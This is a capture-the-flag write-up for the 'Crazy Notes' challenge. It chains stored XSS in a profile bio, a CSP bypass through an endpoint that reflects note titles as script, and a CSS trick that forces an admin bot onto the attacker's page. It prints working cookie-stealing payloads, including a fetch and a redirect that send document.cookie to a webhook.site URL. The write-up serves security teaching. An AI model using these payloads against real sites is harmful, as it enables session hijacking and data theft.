---
title: "Crazy Notes — XSS + CSP Bypass Writeup"
published: 2026-10-02
description: "Chaining HTML injection, a CSP bypass via a JS-reflecting endpoint, and bot-click denial to exfiltrate the admin's flag cookie through a webhook"
tags: [xss, csp-bypass, web-exploitation, playwright, flask]
category: Writeups
draft: false
---
 
- **Challenge**: Crazy Notes
- **Category**: Web Exploitation
- **Difficulty**: 900 pts
- **Flag**: `Securinets{s0me_fun_f0r_xss_f4ns}`
- **Event**: Securinets CTF

 This challenge tests:
 
1. **Cross-Site Scripting (XSS)** — injecting malicious JavaScript into a page that other users (in this case, an admin bot) will view.
2. **Content Security Policy (CSP)** — a browser security feature that restricts what scripts can run on a page.
3. **CSP Bypass** — finding a way around those restrictions.
4. **Bot Exploitation** — tricking an automated admin bot into executing your payload.
5. **Data Exfiltration** — stealing sensitive data (the flag cookie) and sending it to a server you control.


## The Setup
The challenge provides a note-taking web application called **"Noted"** with:
 
- A Flask backend (`app.py`)
- A Playwright-based admin bot (`bot.js`)
- A SQLite database
- Docker Compose for orchestration

## Step 1 : Initial Recon

When i first get into this challenge, I saw a simple note taking app called "Noted". I could 
register, log in, create notes, edit my bio, and click a "Trigger admin" button to ask the admin
bot to visit my notes.

I read the provided source code and 3 things caught my eye.

**The profile Bio is rendered with `|safe` ;**

```html
<p class="muted">{{ bio | safe }}</p>
```

In Jinja2 (Flask's templating engine), `|safe` tells the template engine: *"Don't escape this HTML. Render it as raw HTML."* This means if a user puts `<script>alert(1)</script>` in their bio, it will be rendered as actual HTML/JavaScript — **not** as harmless text. This is our XSS entry point.
 
**There's a Content Security Policy (CSP):**
 
```python
CSP_POLICY = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/dompurify/; ..."
```
 
CSP is a browser security layer that tells the browser: *"Only run scripts from these sources."* Here:
 
- `script-src 'self'` means **inline scripts** (`<script>alert(1)</script>`) are **blocked**.
- Only scripts loaded from the **same origin** (`/static/notes.js`, etc.) and from **cdnjs.cloudflare.com** (for DOMPurify) are allowed.
So a naive `<script>alert(1)</script>` in the bio won't work. We need a **CSP bypass**.
 
**The `/note/<id>/stats` endpoint reflects the note title:**
 
```python
return f"Note: {note[1]}, Visit Count: {note[2]}"
```
 
`note[1]` is the note's **title**. This endpoint returns plain text, but since it doesn't set a `Content-Type` header, the browser will **sniff** the content. If we load this endpoint as a `<script src="...">`, the browser will try to execute it as JavaScript.
 
If our note title is valid JavaScript, the browser will execute it!
 
## Step 2: The Admin Bot
 
```js
await page.goto(`${APP_URL}/login`);
await page.fill('input[name="username"]', 'admin');
await page.fill('input[name="password"]', ADMIN_PASSWORD);
await page.click('button[type="submit"]');
...
await page.goto(url, { waitUntil: 'networkidle', timeout: 10000 });
res.send('Notes visited by bot');
try {
    await page.locator('#view-btn').click();
    await page.waitForLoadState('networkidle');
} catch (error) {
    if (error instanceof errors.TimeoutError) {
        const profileUrl = `${APP_URL}/user/${user_id}/profile`;
        await page.goto(profileUrl, { waitUntil: 'networkidle', timeout: 10000 });
    }
}
```
 
The bot:
 
1. Logs in as **admin**.
2. Sets a **`flag` cookie** with the secret flag.
3. Visits `/user/<user_id>/notes` — the attacker's notes page.
4. Tries to click the `#view-btn` (View Random Note button) with a **10-second timeout**.
5. **If the click times out** → it falls back to visiting `/user/<user_id>/profile`.
This fallback is the key to the exploit. I needed to make the click **time out** so the bot visits my profile page and executes my XSS payload.
 
The note button color is also user-controlled:
 
```python
c.execute('UPDATE users SET note_button_color = ? WHERE id=?', (color, user_id))
```
 
```html
<button id="view-btn" type="button" ... style="background-color: {{ color_input }}">View Random Note</button>
```
 
If I set it to `red; pointer-events: none;`, the button becomes **unclickable** — Playwright will wait and eventually time out.
 
Last detail: the flag cookie is not `HttpOnly`:
 
```js
await context.addCookies([{
    name: 'flag',
    value: FLAG,
    url: APP_URL
}]);
```
 
Since it's not `HttpOnly`, JavaScript can read it via `document.cookie`.
 
## Step 3: What Is a Webhook?
 
A **webhook** is a URL that **you** own, which **someone else's server** (or in this case, the admin bot's browser) can send data to. You don't need to run any server yourself — you just use a free public service like:
 
- **[webhook.site](https://webhook.site)** (what I used)
- **[pipedream.com/requestbin](https://pipedream.com/requestbin)**
- **[requestcatcher.com](https://requestcatcher.com)**
Visiting webhook.site gives you a unique URL like:
 
```
https://webhook.site/16ea0729-e75c-4e57-9e14-930b1eee68df
```
 
Any HTTP request sent to that URL appears **instantly** on the dashboard, showing the sender's IP, method, headers, and body/query string.
 
In XSS challenges, you can't just print `document.cookie` on screen — you're not the one running the script, the **admin bot** is. A webhook is the channel for the bot to send the stolen data back to you:
 
```js
fetch('https://webhook.site/YOUR-URL?cookie=' + document.cookie);
```
 
## Step 4: Crafting the JavaScript Payload
 
I needed a note **title** that is valid JavaScript. The title length limit was **80 characters**, so I had to be creative.
 
The goal: read `document.cookie`, and send it to my webhook.
 
```js
1;location=document.currentScript.src.split('#')[1]+btoa(document.cookie);//
```
 
Breaking it down:
 
- `1;` — a harmless expression followed by a semicolon.
- `document.currentScript.src` — the full URL of the script, e.g. `http://note-app:5014/note/21/stats#//webhook.site/16ea.../?`
- `.split('#')[1]` — splits on `#` and takes the part after it (my webhook URL).
- `+ btoa(document.cookie)` — Base64-encodes the cookie so special characters like `{}`, `;`, `=` don't break the URL.
- `location = ...` — redirects the bot's browser to `<webhook>?<base64 cookie>`.
- `//` — comments out the rest of the reflected output (`Visit Count: 0`).
## Step 5: Creating the Note and Injecting the Bio
 
I created a new note with:
 
- **Title:** `1;location=document.currentScript.src.split('#')[1]+btoa(document.cookie);//`
- **Content:** anything (irrelevant).
My note ID ended up being **21**. I then edited my profile bio to:
 
```html
<script src="/note/21/stats#//webhook.site/16ea0729-e75c-4e57-9e14-930b1eee68df/?"></script>
```
 
When anyone visits my profile:
 
1. The browser sees `<script src="/note/21/stats#...">`.
2. It requests `/note/21/stats` from the same origin → allowed by CSP (`script-src 'self'`).
3. The server responds with: `Note: 1;location=document.currentScript.src.split('#')[1]+btoa(document.cookie);//, Visit Count: 0`
4. The browser executes this as JavaScript → reads the cookie → redirects to my webhook.
## Step 6: Forcing the Bot to Fall Back to the Profile Page
 
The bot first visits `/user/<id>/notes` and tries to click the "View Random Note" button. If the click succeeds, it never visits the profile, and the payload never fires.
 
I set my button color to:
 
```
red; pointer-events: none;
```
 
`pointer-events: none` makes the element unclickable. Playwright's `click()` waits 10 seconds and throws a `TimeoutError`, and the `catch` block then visits my profile.
 
I saved that button color via `fetch` in the browser console:
 
```js
fetch('/user/44/preferences/button-color', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'color=' + encodeURIComponent('red; pointer-events: none;')
});
```
 
## Step 7: Triggering the Bot
 
I clicked **"Trigger admin"** on my profile. The bot:
 
1. Logged in as admin.
2. Set the `flag` cookie.
3. Visited my notes page.
4. Tried to click the button → **timed out after 10 seconds**.
5. Fell back → visited my profile.
6. My profile loaded the script from `/note/21/stats`.
7. The script executed → read the flag cookie → redirected to my webhook.
## Step 8: Reading the Flag
 
I checked my webhook.site dashboard. A new request appeared from a **different IP** (the bot's) with a `HeadlessChrome` User-Agent. The query string was:
 
```
ZmxhZz1TZWN1cmluZXRze3MwbWVfZnVuX2Ywcl94c3NfZjRuc30=
```
 
Decoded with Base64:
 
```
flag=Securinets{s0me_fun_f0r_xss_f4ns}
```
 
**Flag:** `Securinets{s0me_fun_f0r_xss_f4ns}`
 
## Exploit Chain Summary
 
```
[Attacker creates note with JS title]
            ↓
[Attacker puts <script src="/note/<id>/stats#webhook"> in bio]
            ↓
[Attacker sets button color to "red; pointer-events: none;"]
            ↓
[Attacker clicks "Trigger admin"]
            ↓
[Bot logs in as admin, gets flag cookie]
            ↓
[Bot visits /user/<id>/notes → clicks #view-btn → times out (10s)]
            ↓
[Bot falls back to /user/<id>/profile]
            ↓
[Bio loads /note/<id>/stats as JS]
            ↓
[JS reads document.cookie → redirects to webhook with btoa(cookie)]
            ↓
[Attacker decodes Base64 in webhook → flag]
```
 
## Troubleshooting Notes
 
**"Why am I getting 0-byte requests?"**
Because I was the one triggering the payload by visiting my own profile — my cookie is empty. Only the admin bot has the flag cookie. Click "Trigger admin" and wait for the bot's request.
 
**"How do I know which webhook request is from the bot?"**
Check the IP address and User-Agent. Your own browser shows your IP plus a normal browser's User-Agent. The bot shows a different IP plus `HeadlessChrome/...`.
 
**"My own profile visit redirected me!"**
The bio executes immediately for anyone viewing it, including you. Disable JavaScript temporarily in DevTools, use an incognito window, or trigger the bot via `curl` instead.
 
